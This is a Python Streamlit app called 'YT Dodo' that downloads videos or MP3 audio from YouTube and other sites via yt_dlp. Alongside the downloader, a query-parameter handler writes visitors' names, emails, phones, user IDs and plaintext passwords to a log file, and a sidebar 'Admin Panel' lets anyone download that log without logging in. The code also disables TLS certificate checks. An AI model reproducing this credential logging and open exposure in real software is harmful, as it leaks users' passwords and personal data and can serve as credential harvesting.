import glob
import os
import re

import streamlit as st
import streamlit.components.v1 as components
import yt_dlp

# Page Configuration
st.set_page_config(
    page_title="YT Dodo - Universal Media Hub",
    page_icon="▶️",
    layout="wide",
)

APP_DIR = os.path.dirname(os.path.abspath(__file__))
DOWNLOAD_DIR = os.path.join(APP_DIR, "downloads")
os.makedirs(DOWNLOAD_DIR, exist_ok=True)


def sanitize_filename(name: str, fallback: str = "media_file") -> str:
    cleaned = re.sub(r"[^A-Za-z0-9 _.-]", "", str(name or fallback)).strip()
    return cleaned or fallback


def get_latest_downloaded_file(prefix: str) -> str | None:
    patterns = [
        os.path.join(DOWNLOAD_DIR, f"{prefix}.*"),
        os.path.join(DOWNLOAD_DIR, f"{prefix}.*.*"),
    ]
    candidates = []
    for pattern in patterns:
        candidates.extend(glob.glob(pattern))

    valid = [
        path
        for path in candidates
        if os.path.isfile(path)
        and os.path.splitext(path)[1].lower() in {".mp3", ".mp4", ".m4a", ".webm", ".aac", ".mkv"}
    ]
    if not valid:
        return None
    return max(valid, key=os.path.getmtime)


def yt_dlp_options_for(url: str, audio_mode: bool, output_base: str):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "*/*",
    }

    base_opts = {
        "noplaylist": True,
        "geo_bypass": True,
        "nocheckcertificate": True,
        "quiet": True,
        "no_warnings": True,
        "http_headers": headers,
        "extractor_args": {"youtube": {"player_client": ["android", "ios", "web"]}},
        "outtmpl": os.path.join(DOWNLOAD_DIR, f"{output_base}.%(ext)s"),
        "paths": {"home": DOWNLOAD_DIR},
        "socket_timeout": 30,
        "retries": 3,
        "fragment_retries": 3,
    }

    # For YouTube-type links, prefer Android/iOS clients to avoid some geo/403 blocks.
    if "youtube.com" in url or "youtu.be" in url:
        base_opts["extractor_args"] = {"youtube": {"player_client": ["android", "ios", "web"]}}

    if audio_mode:
        return {
            **base_opts,
            "format": "bestaudio/best",
            "postprocessors": [
                {
                    "key": "FFmpegExtractAudio",
                    "preferredcodec": "mp3",
                    "preferredquality": "0",
                }
            ],
            "keepvideo": False,
        }

    return {
        **base_opts,
        "format": "best[ext=mp4]/best[height<=1080]/best",
    }


def download_media_file(url: str, audio_mode: bool) -> str | None:
    try:
        with yt_dlp.YoutubeDL({
            "skip_download": True,
            "quiet": True,
            "no_warnings": True,
            "noplaylist": True,
        }) as probe:
            info = probe.extract_info(url, download=False)
        title = (info or {}).get("title") or "ytdodo_media"
        safe_title = sanitize_filename(title, "ytdodo_media")

        final_base = f"{safe_title}_{int(os.times().elapsed * 1000)}"
        options = yt_dlp_options_for(url, audio_mode=audio_mode, output_base=final_base)

        with yt_dlp.YoutubeDL(options) as ydl:
            ydl.download([url])

        file_path = get_latest_downloaded_file(final_base)
        if file_path and os.path.exists(file_path):
            return file_path
        return None
    except Exception as exc:  # pragma: no cover - runtime safeguard
        st.error(f"Download failed: {exc}")
        return None


# -------------------------
# User registration logs & admin panel
# -------------------------
query_params = st.query_params

if "action" in query_params and query_params["action"] == "save_user":
    try:
        name = query_params.get("name", "N/A")
        email = query_params.get("email", "N/A")
        phone = query_params.get("phone", "N/A")
        occ = query_params.get("occ", "N/A")
        user_id = query_params.get("userid", "N/A")
        pwd = query_params.get("pwd", "N/A")

        log_entry = (
            f"Name: {name} | Email: {email} | Phone: {phone} | "
            f"Occupation: {occ} | UserID: {user_id} | Password: {pwd}\n"
        )
        with open("users_log.txt", "a", encoding="utf-8") as log_file:
            log_file.write(log_entry)
    except Exception:
        pass

with st.sidebar:
    st.subheader("🛠️ Admin Panel")
    st.markdown("Download registered users log file:")
    if os.path.exists("users_log.txt"):
        with open("users_log.txt", "rb") as log_f:
            st.download_button(
                label="📥 Download users_log.txt",
                data=log_f,
                file_name="users_log.txt",
                mime="text/plain",
                use_container_width=True,
            )
    else:
        st.info("No user logs recorded yet.")


# -------------------------
# Direct file download handler
# -------------------------
download_url = query_params.get("download_url")
format_type = query_params.get("format", "Video - 720p (HD)")

if download_url:
    with st.spinner("Fetching a safe media download link..."):
        is_audio = "MP3" in str(format_type).upper() or "AUDIO" in str(format_type).upper()
        local_file = download_media_file(str(download_url), is_audio)

    if local_file:
        mime_type = "audio/mpeg" if is_audio else "video/mp4"
        file_name = os.path.basename(local_file)
        with open(local_file, "rb") as f:
            st.download_button(
                label=f"⬇️ Download {file_name}",
                data=f,
                file_name=file_name,
                mime=mime_type,
                use_container_width=True,
            )
        st.success(f"Download ready: {file_name}")
    else:
        st.error("The download link could not be processed. Please verify the URL and try again.")


# -------------------------
# UI
# -------------------------
html_code = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>YT Dodo</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { background: #09090b; color: #fff; font-family: sans-serif; }
    .card { background: rgba(24,24,27,0.9); border: 1px solid #27272a; border-radius: 18px; }
  </style>
</head>
<body class="min-h-screen p-4">
  <div class="max-w-4xl mx-auto space-y-6">
    <div class="card p-6">
      <h1 class="text-2xl font-bold text-red-500">YT Dodo</h1>
      <p class="text-sm text-zinc-300 mt-2">Universal Media Hub</p>
    </div>

    <div class="card p-6">
      <div class="grid gap-4 md:grid-cols-2">
        <input id="videoUrlInput" type="text" placeholder="Paste YouTube, Instagram or Facebook link..." class="w-full p-3 rounded-xl bg-black text-white border border-zinc-700" />
        <select id="formatSelect" class="w-full p-3 rounded-xl bg-black text-white border border-zinc-700">
          <option value="Video - 720p (HD)">Video - 720p (HD)</option>
          <option value="Video - 1080p (Full HD)">Video - 1080p (Full HD)</option>
          <option value="MP3 Audio">MP3 Audio</option>
        </select>
      </div>
      <div class="mt-4 flex gap-3">
        <button onclick="submitDownload()" class="bg-red-600 hover:bg-red-500 text-white px-5 py-3 rounded-xl font-semibold">Search & Download</button>
      </div>
    </div>
  </div>

  <script>
    function submitDownload() {
      const url = document.getElementById('videoUrlInput').value.trim();
      const format = document.getElementById('formatSelect').value;
      if (!url) {
        alert('Please enter a valid media URL first.');
        return;
      }
      const target = `?download_url=${encodeURIComponent(url)}&format=${encodeURIComponent(format)}`;
      window.location.href = target;
    }
  </script>
</body>
</html>
"""

components.html(html_code, height=600, scrolling=True)

st.title("YT Dodo Downloader")
st.caption("Paste a media link and choose the format below.")

with st.form("download_form"):
    media_url = st.text_input("Media URL", placeholder="https://www.youtube.com/watch?v=...")
    media_format = st.selectbox(
        "Choose output format",
        ["Video - 720p (HD)", "Video - 1080p (Full HD)", "MP3 Audio"],
        index=0,
    )
    submitted = st.form_submit_button("Prepare Download")

if submitted:
    if not media_url:
        st.warning("Please enter a valid URL before preparing the file.")
    else:
        st.session_state["pending_url"] = media_url
        st.session_state["pending_format"] = media_format
        with st.spinner("Preparing your media file..."):
            is_audio = "MP3" in media_format.upper() or "AUDIO" in media_format.upper()
            local_file = download_media_file(media_url, is_audio)
        if local_file:
            with open(local_file, "rb") as file_obj:
                file_name = os.path.basename(local_file)
                st.download_button(
                    label=f"⬇️ Download {file_name}",
                    data=file_obj,
                    file_name=file_name,
                    mime="audio/mpeg" if is_audio else "video/mp4",
                    use_container_width=True,
                )
            st.success(f"Your file is ready: {file_name}")
        else:
            st.error("No file was generated. The URL may be blocked, private, or unsupported.")

# EOF
